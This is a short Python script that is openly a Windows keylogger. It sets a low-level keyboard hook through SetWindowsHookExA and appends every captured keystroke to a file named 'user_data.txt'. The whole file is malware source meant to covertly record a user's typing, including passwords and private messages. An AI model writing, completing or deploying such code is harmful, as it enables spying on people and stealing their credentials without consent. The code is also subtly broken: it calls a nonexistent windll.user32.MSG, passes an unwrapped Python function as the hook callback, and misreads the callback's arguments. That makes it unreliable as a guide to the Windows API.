import os
import sys
from ctypes import windll

def log_keystrokes(key):
    try:
        if key == 27: # ESC key
            return False
        with open('user_data.txt', 'a') as f:
            if key >= 32 and key <= 126:
                f.write(chr(key))
            else:
                f.write(f'[{key}]')
    except Exception as e:
        pass

def hook_keyboard(callback):
    windll.user32.SetWindowsHookExA(13, callback, None, 0)
    msg = windll.user32.MSG()
    while windll.user32.GetMessageA(msg, 0, 0, 0) != 0:
        windll.user32.TranslateMessage(msg)
        windll.user32.DispatchMessageA(msg)

def key_logger(key):
    return log_keystrokes(key)

hook_keyboard(key_logger)